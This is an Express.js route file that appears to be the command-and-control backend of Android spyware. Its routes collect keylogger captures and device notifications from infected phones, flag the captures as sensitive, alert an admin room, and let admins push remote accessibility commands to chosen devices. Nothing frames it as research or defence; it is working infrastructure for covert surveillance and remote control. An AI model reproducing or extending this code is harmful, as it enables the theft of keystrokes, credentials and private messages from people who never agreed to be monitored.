const express = require('express');
const { Op } = require('sequelize');

const db = require('../models');
const { Device, AccessibilityData, Command } = db;

const { authenticateToken, authenticateDevice, requireAdmin } = require('../middleware/auth');
const logger = require('../utils/logger');

const router = express.Router();

/*
------------------------------------------------
Keylogger data
------------------------------------------------
*/
router.post('/keylogger', authenticateDevice, async (req, res) => {

  try {

    const device = await Device.findOne({
      where: { device_id: req.deviceId }
    });

    if (!device) {
      return res.status(404).json({ success: false });
    }

    const entry = await AccessibilityData.create({
      device_id: device.id,
      data_type: 'keylogger',
      ...req.body,
      is_sensitive: true
    });

    if (req.io) {
      req.io.to('admin-room').emit('accessibility-data', {
        device_id: req.deviceId,
        type: 'keylogger'
      });
    }

    res.json({
      success: true,
      id: entry.id
    });

  } catch (error) {

    logger.error('Accessibility keylogger error', error);

    res.status(500).json({
      success: false
    });

  }

});

/*
------------------------------------------------
Notifications
------------------------------------------------
*/
router.post('/notifications', authenticateDevice, async (req, res) => {

  try {

    const device = await Device.findOne({
      where: { device_id: req.deviceId }
    });

    if (!device) {
      return res.status(404).json({ success: false });
    }

    const data = req.body.notifications.map(n => ({
      device_id: device.id,
      data_type: 'notifications',
      ...n
    }));

    await AccessibilityData.bulkCreate(data);

    res.json({
      success: true,
      count: data.length
    });

  } catch (error) {

    logger.error('Accessibility notification error', error);

    res.status(500).json({ success: false });

  }

});

/*
------------------------------------------------
Admin run accessibility command
------------------------------------------------
*/
router.post('/command', authenticateToken, requireAdmin, async (req, res) => {

  try {

    const device = await Device.findByPk(req.body.device_id);

    if (!device) {
      return res.status(404).json({ success: false });
    }

    const command = await Command.create({
      device_id: device.id,
      command_type: 'run_accessibility_command',
      command_data: req.body.command_data,
      created_by: req.user.id
    });

    if (req.io) {
      req.io.to(`device-${device.device_id}`).emit('new-command', {
        command
      });
    }

    res.json({
      success: true,
      command_id: command.id
    });

  } catch (error) {

    logger.error('Accessibility command error', error);

    res.status(500).json({ success: false });

  }

});

module.exports = router;